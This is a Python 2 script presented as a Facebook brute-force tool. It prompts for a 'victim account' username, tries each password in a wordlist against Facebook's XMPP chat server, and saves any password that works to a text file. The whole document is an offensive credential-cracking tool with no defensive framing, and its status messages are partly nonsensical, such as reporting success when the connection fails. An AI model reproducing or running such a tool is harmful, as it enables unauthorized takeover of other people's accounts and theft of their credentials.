#!/usr/bin/python

import xmpp
import sys
import urllib,re
import time
import random
import datetime
 
def internet_on():
	try :
		data = urllib.urlopen('https://www.google.com')
		return True
	except :
		return False
		
if internet_on() == True:
	print """ 
		# usage: Facebook-brute-force.py [wordlist file]
															 
														"""     
	 
	 
	 
	 
	login = raw_input("Enter username of victim account : ")
	 
	 
	password_list   = open(sys.argv[1],"r")
	 
	_login=login+"@chat.facebook.com"
	 
	print "[+]Connecting To Facebook Terminal Server... "
	print "[+]Connection Has Been Establishing Successfully To The Server..."
	print "[+]Negotiating With The Protocol..."
	print "[+]There was no error with Port..."
	print "[+]You Are Successfully Connected Enj0y..."
	print "[+]Attack Has Been Started Be Patient..."
		 
	for pwd in password_list:
	 
		sys.stdout.write(".")
		sys.stdout.flush()
	 
		pwd=pwd.strip('\n')
	 
		jid = xmpp.protocol.JID(_login)
		cl = xmpp.Client(jid.getDomain(), debug=[])
	 
		if cl.connect(('chat.facebook.com',5222)):
			print "!~Injecting Password~!"
			
		else:
			print "[+]Successed[+]"
	 
		print '[!]',pwd
	 
		if cl.auth(jid.getNode(), pwd):
			cl.sendInitPresence()
			print "[+] -> The Account Has Been Cracked ^__^ "," Password Found ==> : ",pwd
			file = open(login+".txt", "w")
			file.write("Email : " +login+ "@facebook.com\n")
			file.write("Password : " +pwd+ "\n")
			file.write(str(datetime.datetime.now()))
			file.close()
			break
	 
		cl.disconnect()
		time.sleep(2)
else:
	print "You have a problem to connect to the Internet :(" 
